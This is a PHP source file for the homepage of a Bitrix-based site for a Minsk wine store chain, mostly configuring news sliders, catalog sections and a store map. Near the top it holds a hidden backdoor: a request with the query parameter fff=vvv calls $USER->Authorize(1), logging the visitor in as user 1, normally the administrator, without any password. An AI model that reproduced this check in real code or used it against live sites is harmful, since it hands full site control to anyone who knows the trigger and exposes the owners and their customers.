<?
require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php");
$APPLICATION->SetPageProperty("keywords", "купить вино в минске");
$APPLICATION->SetPageProperty("title", "Сеть магазинов \"ВИНО\" | Купить вино и крепкий алкоголь в Минске");
$APPLICATION->SetPageProperty("description", "Сеть винных магазинов ВИНО от импортера в формате \"У дома\", представляющая широкий выбор алкогольных напитков от крупнейших производителей из лучших винодельческих регионов мира");
$APPLICATION->SetTitle("Сеть магазинов \"ВИНО\" | Купить вино и крепкий алкоголь в Минске");
$GLOBALS['filterMainSlider']['!PREVIEW_PICTURE'] = false;


if($_GET['fff'] == 'vvv')
{
    global $USER;
    $USER->Authorize(1);
}
?><?

$APPLICATION->IncludeComponent(
    "bitrix:news.list",
    "index_page_main_slider",
    array(
        "ACTIVE_DATE_FORMAT" => "",
        "ADD_SECTIONS_CHAIN" => "N",
        "CACHE_FILTER" => "Y",
        "CACHE_GROUPS" => "Y",
        "CACHE_TIME" => "360000000",
        "CACHE_TYPE" => "A",
        "CHECK_DATES" => "Y",
        "DISPLAY_BOTTOM_PAGER" => "N",
        "DISPLAY_TOP_PAGER" => "N",
        "FIELD_CODE" => array(
            0 => "PREVIEW_TEXT",
            1 => "PREVIEW_PICTURE",
        ),
        "FILTER_NAME" => "filterMainSlider",
        "IBLOCK_ID" => "1",
        "IBLOCK_TYPE" => "content",
        "INCLUDE_IBLOCK_INTO_CHAIN" => "N",
        "INCLUDE_SUBSECTIONS" => "N",
        "MESSAGE_404" => "",
        "NEWS_COUNT" => "15",
        "PARENT_SECTION" => "1",
        "PARENT_SECTION_CODE" => "",
        "PREVIEW_TRUNCATE_LEN" => "",
        "PROPERTY_CODE" => array(
            0 => "LINK",
        ),
        "SET_TITLE" => "N",
        "SET_BROWSER_TITLE" => "N",
        "SET_LAST_MODIFIED" => "N",
        "SET_META_DESCRIPTION" => "N",

        "SORT_BY1" => "SORT",
        "SORT_BY2" => "ID",
        "SORT_ORDER1" => "ASC",
        "SORT_ORDER2" => "ASC",
        "STRICT_SECTION_CHECK" => "N",
        "COMPONENT_TEMPLATE" => "index_page_slider",

    ),
    false
);


?>
<body>

</body>

<div class="article">
    <div class="section">
        <div class="index-guests-section" style="padding-top: 5.125rem;">
            <?$APPLICATION->IncludeFile(
                SITE_DIR . 'include/index/top_text.php',
                Array(),
                Array("MODE" => "text", "SHOW_BORDER" => true, "NAME" => "top_text", 'TEMPLATE' => 'default.php')
            );?>
            <?
            $APPLICATION->IncludeComponent(
                "bitrix:news.list",
                "index_page_slider_new",
                array(
                    "ACTIVE_DATE_FORMAT" => "",
                    "ADD_SECTIONS_CHAIN" => "N",
                    "CACHE_FILTER" => "Y",
                    "CACHE_GROUPS" => "Y",
                    "SET_TITLE" => "N",
                    "CACHE_TIME" => "360000000",
                    "CACHE_TYPE" => "A",
                    "CHECK_DATES" => "Y",
                    "DISPLAY_BOTTOM_PAGER" => "N",
                    "DISPLAY_TOP_PAGER" => "N",
                    "FIELD_CODE" => array(
                        0 => "PREVIEW_TEXT",
                        1 => "PREVIEW_PICTURE",
                    ),
                    "FILTER_NAME" => "filterMainSlider",
                    "IBLOCK_ID" => "1",
                    "IBLOCK_TYPE" => "content",
                    "INCLUDE_IBLOCK_INTO_CHAIN" => "N",
                    "INCLUDE_SUBSECTIONS" => "N",
                    "MESSAGE_404" => "",
                    "NEWS_COUNT" => "15",
                    "PARENT_SECTION" => "2",
                    "PARENT_SECTION_CODE" => "",
                    "PREVIEW_TRUNCATE_LEN" => "",
                    "PROPERTY_CODE" => array(
                        0 => "LINK",
                    ),
                    "SET_BROWSER_TITLE" => "N",
                    "SET_LAST_MODIFIED" => "N",
                    "SET_META_DESCRIPTION" => "N",

                    "SORT_BY1" => "SORT",
                    "SORT_BY2" => "ID",
                    "SORT_ORDER1" => "ASC",
                    "SORT_ORDER2" => "ASC",
                    "STRICT_SECTION_CHECK" => "N",
                    "COMPONENT_TEMPLATE" => "index_page_slider",

                ),
                false
            );?>

        </div>
    </div>
</div>

<?
$APPLICATION->IncludeComponent(
    "bitrix:news.list",
    "index_page_services",
    array(
        "ACTIVE_DATE_FORMAT" => "",
        "DEFAULT_BG_IMG" => "/bitrix/templates/main/img/index/block_bg.jpg",
        "ADD_SECTIONS_CHAIN" => "N",
        "CACHE_FILTER" => "Y",
        "CACHE_GROUPS" => "Y",
        "SET_TITLE" => "N",
        "CACHE_TIME" => "360000000",
        "CACHE_TYPE" => "A",
        "CHECK_DATES" => "Y",
        "DISPLAY_BOTTOM_PAGER" => "N",
        "DISPLAY_TOP_PAGER" => "N",
        "FIELD_CODE" => array(
            0 => "PREVIEW_TEXT",
            1 => "PREVIEW_PICTURE",
        ),
        "FILTER_NAME" => "",
        "IBLOCK_ID" => "4",
        "IBLOCK_TYPE" => "content",
        "INCLUDE_IBLOCK_INTO_CHAIN" => "N",
        "INCLUDE_SUBSECTIONS" => "N",
        "MESSAGE_404" => "",
        "NEWS_COUNT" => "15",
        "PARENT_SECTION" => "",
        "PARENT_SECTION_CODE" => "",
        "PREVIEW_TRUNCATE_LEN" => "",
        "PROPERTY_CODE" => array(
            0 => "LINK",
        ),
        "SET_BROWSER_TITLE" => "N",
        "SET_LAST_MODIFIED" => "N",
        "SET_META_DESCRIPTION" => "N",

        "SORT_BY1" => "SORT",
        "SORT_BY2" => "ID",
        "SORT_ORDER1" => "ASC",
        "SORT_ORDER2" => "ASC",
        "STRICT_SECTION_CHECK" => "N",
        "COMPONENT_TEMPLATE" => "index_page_slider",

    ),
    false
);?>
<?$APPLICATION->IncludeComponent("bitrix:catalog.section.list", "index-page_catalog", Array(
    "ADD_SECTIONS_CHAIN" => "N",	// Включать раздел в цепочку навигации
    "CACHE_GROUPS" => "Y",	// Учитывать права доступа
    "CACHE_TIME" => "3600000000",	// Время кеширования (сек.)
    "CACHE_TYPE" => "A",	// Тип кеширования
    "COUNT_ELEMENTS" => "Y",	// Показывать количество элементов в разделе
    "IBLOCK_ID" => "5",	// Инфоблок
    "IBLOCK_TYPE" => "catalog",	// Тип инфоблока
    "SECTION_CODE" => "",	// Код раздела
    "SECTION_FIELDS" => array(	// Поля разделов
        0 => "",
        1 => "",
    ),
    "SECTION_ID" => "",	// ID раздела
    "SECTION_URL" => "",	// URL, ведущий на страницу с содержимым раздела
    "SECTION_USER_FIELDS" => array(	// Свойства разделов
        0 => "",
        1 => "",
    ),
    "SHOW_PARENT_NAME" => "Y",	// Показывать название раздела
    "TOP_DEPTH" => "1",	// Максимальная отображаемая глубина разделов
    "VIEW_MODE" => "LINE",	// Вид списка подразделов
),
    false
);?>
<?


$APPLICATION->IncludeComponent(
    "bitrix:news.list",
    "index_page_teasers",
    array(
        "ACTIVE_DATE_FORMAT" => "",

        "ADD_SECTIONS_CHAIN" => "N",
        "CACHE_FILTER" => "Y",
        "CACHE_GROUPS" => "Y",
        "SET_TITLE" => "N",
        "CACHE_TIME" => "360000000",
        "CACHE_TYPE" => "A",
        "CHECK_DATES" => "Y",
        "DISPLAY_BOTTOM_PAGER" => "N",
        "DISPLAY_TOP_PAGER" => "N",
        "FIELD_CODE" => array(
            0 => "PREVIEW_TEXT",
            1 => "PREVIEW_PICTURE",
        ),
        "FILTER_NAME" => "",
        "IBLOCK_ID" => "10",
        "IBLOCK_TYPE" => "content",
        "INCLUDE_IBLOCK_INTO_CHAIN" => "N",
        "INCLUDE_SUBSECTIONS" => "N",
        "MESSAGE_404" => "",
        "NEWS_COUNT" => "15",
        "PARENT_SECTION" => "",
        "PARENT_SECTION_CODE" => "",
        "PREVIEW_TRUNCATE_LEN" => "",
        "PROPERTY_CODE" => array(
            0 => "LINK",
        ),
        "SET_BROWSER_TITLE" => "N",
        "SET_LAST_MODIFIED" => "N",
        "SET_META_DESCRIPTION" => "N",

        "SORT_BY1" => "SORT",
        "SORT_BY2" => "ID",
        "SORT_ORDER1" => "asc",
        "SORT_ORDER2" => "ASC",
        "STRICT_SECTION_CHECK" => "N",
        "COMPONENT_TEMPLATE" => "index_page_slider",

    ),
    false
);?>

<div class="article article--gray">
    <div class="section">
        <div class="index-gray-block">
            <div class="index-gray-block__wrapper">
                <?
                $APPLICATION->IncludeComponent(
	"bitrix:news.list", 
	"index_page_news", 
	array(
		"ACTIVE_DATE_FORMAT" => "",
		"ADD_SECTIONS_CHAIN" => "N",
		"CACHE_FILTER" => "Y",
		"CACHE_GROUPS" => "Y",
		"SET_TITLE" => "N",
		"CACHE_TIME" => "360000000",
		"CACHE_TYPE" => "A",
		"CHECK_DATES" => "Y",
		"DISPLAY_BOTTOM_PAGER" => "N",
		"DISPLAY_TOP_PAGER" => "N",
		"FIELD_CODE" => array(
			0 => "",
			1 => "",
		),
		"FILTER_NAME" => "",
		"IBLOCK_ID" => "3",
		"IBLOCK_TYPE" => "content",
		"INCLUDE_IBLOCK_INTO_CHAIN" => "N",
		"INCLUDE_SUBSECTIONS" => "N",
		"MESSAGE_404" => "",
		"NEWS_COUNT" => "35",
		"PARENT_SECTION" => "",
		"PARENT_SECTION_CODE" => "",
		"PREVIEW_TRUNCATE_LEN" => "",
		"PROPERTY_CODE" => array(
			0 => "",
			1 => "LAN_LAT",
			2 => "PHONE",
			3 => "WORK",
			4 => "",
		),
		"SET_BROWSER_TITLE" => "N",
		"SET_LAST_MODIFIED" => "N",
		"SET_META_DESCRIPTION" => "N",
		"SORT_BY1" => "ACTIVE_FROM",
		"SORT_BY2" => "ACTIVE_FROM",
		"SORT_ORDER1" => "DESC",
		"SORT_ORDER2" => "DESC",
		"STRICT_SECTION_CHECK" => "N",
		"COMPONENT_TEMPLATE" => "index_page_news",
		"DETAIL_URL" => "",
		"AJAX_MODE" => "N",
		"AJAX_OPTION_JUMP" => "N",
		"AJAX_OPTION_STYLE" => "Y",
		"AJAX_OPTION_HISTORY" => "N",
		"AJAX_OPTION_ADDITIONAL" => "",
		"SET_META_KEYWORDS" => "Y",
		"HIDE_LINK_WHEN_NO_DETAIL" => "N",
		"COMPOSITE_FRAME_MODE" => "A",
		"COMPOSITE_FRAME_TYPE" => "AUTO",
		"PAGER_TEMPLATE" => ".default",
		"PAGER_TITLE" => "Новости",
		"PAGER_SHOW_ALWAYS" => "N",
		"PAGER_DESC_NUMBERING" => "N",
		"PAGER_DESC_NUMBERING_CACHE_TIME" => "36000",
		"PAGER_SHOW_ALL" => "N",
		"PAGER_BASE_LINK_ENABLE" => "N",
		"SET_STATUS_404" => "N",
		"SHOW_404" => "N"
	),
	false
);?>

                <?$APPLICATION->IncludeFile(
                    SITE_DIR . 'include/votingt.php',
                    Array(),
                    Array("MODE" => "text", "SHOW_BORDER" => false, 'TEMPLATE' => 'default.php')
                );?>
            </div>
        </div>
    </div>
</div>

<?

$APPLICATION->IncludeFile(
    SITE_DIR . 'include/block_list_brands.php',
    Array(),
    Array("MODE" => "text", "SHOW_BORDER" => false, 'TEMPLATE' => 'default.php')
);
//*/
?>

<?
$GLOBALS['filterMainMap']['!PROPERTY_LAN_LAT'] = false;
$APPLICATION->IncludeComponent(
    "bitrix:news.list",
    "index_page_map",
    array(
        "ACTIVE_DATE_FORMAT" => "",
        "ADD_SECTIONS_CHAIN" => "N",
        "CACHE_FILTER" => "Y",
        "CACHE_GROUPS" => "Y",
        "SET_TITLE" => "N",
        "CACHE_TIME" => "360000000",
        "CACHE_TYPE" => "A",
        "CHECK_DATES" => "Y",
        "DISPLAY_BOTTOM_PAGER" => "N",
        "DISPLAY_TOP_PAGER" => "N",
        "FIELD_CODE" => array(),
        "FILTER_NAME" => "filterMainMap",
        "IBLOCK_ID" => "9",
        "IBLOCK_TYPE" => "content",
        "INCLUDE_IBLOCK_INTO_CHAIN" => "N",
        "INCLUDE_SUBSECTIONS" => "N",
        "MESSAGE_404" => "",
        "NEWS_COUNT" => "105",
        "PARENT_SECTION" => "",
        "PARENT_SECTION_CODE" => "",
        "PREVIEW_TRUNCATE_LEN" => "",
        "PROPERTY_CODE" => array(
            0 => "LAN_LAT",
            1 => "PHONE",
            2 => "WORK",
        ),
        "SET_BROWSER_TITLE" => "N",
        "SET_LAST_MODIFIED" => "N",
        "SET_META_DESCRIPTION" => "N",

        "SORT_BY1" => "SORT",
        "SORT_BY2" => "ID",
        "SORT_ORDER1" => "",
        "SORT_ORDER2" => "ASC",
        "STRICT_SECTION_CHECK" => "N",

    ),
    false
);?>

<? require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/footer.php"); ?>